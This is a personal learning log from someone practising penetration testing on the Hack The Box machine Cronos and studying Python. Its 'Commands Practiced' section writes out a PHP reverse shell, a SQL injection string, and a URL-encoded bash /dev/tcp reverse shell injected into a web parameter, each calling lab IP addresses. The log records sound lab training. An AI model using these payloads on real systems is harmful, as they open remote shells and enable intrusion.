## Learning Log – 2025-07-12

**Focus Areas**: HTB, Privilege Escalation, SQLi, Burp Suite, Python, linPEAS

---

### Today's Progress

- Completed HTB **Cronos** (Linux, Medium). Exploited a SQL injection vulnerability to gain shell access via command injection through Burp Suite.
- Identified a cron job owned by root and leveraged it for privilege escalation using PHP reverse shell payloads.
- Uploaded and ran `linpeas.sh` for the first time as a local user on the target, revealing significant post-exploitation info.
- Navigated around compiling a 9-year-old PoC by opting for a cleaner cron job-based escalation path.
- Used Burp Suite entirely from memory — no external lookup required.
- Applied resources from Exploit-DB and Oracle's docs for vulnerability verification and contextual info.
- Completed the last remaining MOOC Python segment.
- Switched to *Automate the Boring Stuff with Python* (ATBS) and read/skipped through up to page **82**, reinforcing core Python concepts.

---

### Challenges Faced

- Considered compiling an old vulnerability exploit but anticipated dependency hell on a legacy target — avoided.
- Still internalizing the deluge of information linPEAS outputs; managing signal vs noise was tough.

---

### Wins

- First time using Burp Suite repeater successfully without guidance.
- Handled cron-based privilege escalation independently.
- Shell payload logic is starting to feel second-nature.
- linPEAS usage unlocked a much deeper view into potential escalation vectors.
- Comfortably resumed Python learning flow by switching to a better-aligned resource (ATBS).

### Commands Practiced

- `php -r '$sock=fsockopen("10.10.14.10", 443);exec("/bin/sh -i <&3 >&3 2>&3");'`
- SQLi: `' or 1=1-- -`
- Burp Repeater: `command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.24/443+0>%261'%26host=`

---

### Concepts Reinforced

- Cron jobs as viable and clean privilege escalation vectors.
- Dynamic shell payload crafting and delivery via web interfaces.
- Reverse shell logic across PHP, Bash, and Burp Suite contexts.
- Importance of signal filtering when using automated recon tools like linPEAS.
- Reaffirmed learning style: visual, direct-use Python projects > abstract exercises.

### Tools / Resource(s) Used

- Burp Suite
- linPEAS
- Exploit-DB
- Oracle security docs
- [ATBS — Automate the Boring Stuff with Python (print copy)]

---

### Reflection / Notes to Self

- Feeling a strong shift in fluency — tools like Burp are less intimidating now.
- linPEAS output can overwhelm, but is worth reviewing even after root for skill building.
- ATBS already feels more natural than the MOOC; skipping ahead worked well.

---

### Tomorrow's Goals

- Begin HTB: **Forest** (last of the week).
- Read relevant OSCP Bible sections for Forest, as previously suggested.
- Continue ATBS, aim to complete Chapter 4 and write one small automation script.
